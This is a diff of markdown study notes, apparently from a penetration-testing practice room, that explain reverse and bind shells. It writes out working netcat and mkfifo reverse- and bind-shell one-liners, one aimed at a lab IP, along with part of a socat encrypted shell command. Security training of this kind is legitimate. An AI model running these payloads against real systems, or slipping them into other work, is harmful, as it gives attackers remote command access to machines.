@@ -4,8 +4,8 @@
   * bash, sh, cmd.exe, Powershell.
 * Sometimes possible to force an application running on a remote server to execute arbitrary code.
   * Use this initial access to obtain a shell.
-    * Send command line access to the remote server (a reverse shell).
-    * Open up a port on the remote server to connect to and execute further commands (a bind shell).
+    * **Reverse shell** Send command line access to the remote server.
+    * **Bind shell** Open up a port on the remote server to connect to and execute further commands.
 
 ## Tools
 * Need malicious shellcode and a way of interfacing with the resulting shell.
@@ -41,18 +41,13 @@
 
 ## Types of Shell
 ### Reverse shells
-* Target is forced to execute code that connects back to the attacking.
-* Attacker would set up a listener that would be used to receive the connection.
+* Target is forced to execute code that connects back to the attacker.
+* Attacker sets up a listener used to receive the connection.
 * Reverse shells are a good way to bypass firewall rules that may prevent connecting to arbitrary ports on the target.
-  * Attacker needs to configure their own network to accept the shell when receiving a shell from a machine across the internet the .
+  * Attacker needs to configure their own network to accept the shell when receiving a shell from a machine across the internet.
 * Reverse shells are generally easier to execute and debug.
 
 #### Reverse Shell Example:
-* Reverse shell listener is what receives the connection.
-```
-muri@augury:~$ whoami
-muri
-```
 * Set up the listener on the attacking machine.
   * *Listening* on the attacking machine.
 ```
@@ -61,7 +56,7 @@ listening on [any] 443 ...
 ```
 * Send a reverse shell from the target.
   * Connection is sent *from* the target. 
-  * This is likely to be done through code injection.
+  * This is likely done through code injection.
 ```
 shell@linux-shell-practice:~$ nc 10.11.12.223 443 -e /bin/bash
 ```
@@ -76,9 +71,9 @@ shell
 ```
 
 ### Bind shells
-* Where code executed on the target is used to start a listener attached to a shell directly on the target.
+* Code is executed to start a listener attached to a shell on the target.
 * This would then be opened up to the Internet.
-* Can connect to the port that the code has opened and obtain remote code execution.
+* Attacker connects to the port that the code has opened and obtain remote code execution.
 * Does not require any configuration on the attacker's network.
 * May be prevented by firewalls protecting the target.
 * Bind shells are less common.
@@ -355,17 +350,29 @@ socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sa
 * This technique will work with the special Linux-only TTY shell covered previously.
 
 ## Common Shell Payloads
-* In some versions of netcat (including the nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries, and the version used in Kali itself: netcat-traditional) there is a -e option which allows you to execute a process on connection.
-* For example, as a listener: nc -lvnp <PORT> -e /bin/bash
-* Connecting to the above listener with netcat would result in a bind shell on the target.
-* Equally, for a reverse shell, connecting back with nc <LOCAL-IP> <PORT> -e /bin/bash would result in a reverse shell on the target.
-* However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?).
-* On Windows where a static binary is nearly always required anyway, this technique will work perfectly.
-* On Linux, however, we would instead use this code to create a listener for a bind shell: mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
-* The following paragraph is the technical explanation for this command:
-* The command first creates a named pipe at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.
-* A very similar command can be used to send a netcat reverse shell: mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
-* This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.
+* Some versions of netcat include `-e` option.
+  * nc.exe Windows version included with Kali at `/usr/share/windows-resources/binaries`.
+  * `netcat-traditional` version used in Kali.
+* Allows execution of a process on connection.    
+* Create bind shell listener on target for attacker to connect to.
+  * Not included in most versions of netcat as widely seen to be very insecure.
+```
+nc -lvnp <PORT> -e /bin/bash
+```
+* Send a reverse shell to listener on attacker.
+```
+nc <LOCAL-IP> <PORT> -e /bin/bash
+```
+* This technique will work perfectly on Windows where a static binary is nearly always required.
+* Create a listener for a bind shell on Linux.
+```
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+> The command first creates a named pipe at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the `stderr` output stream into `stdout`, and sending `stdout` itself into the input of the named pipe, thus completing the circle.
+* Send a netcat reverse shell.
+```
+mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
 * When targeting a modern Windows Server, it is very common to require a Powershell reverse shell.
 * This command is very convoluted, so for the sake of simplicity it will not be explained directly here.
 * It is, however, an extremely useful one-liner to keep on hand:
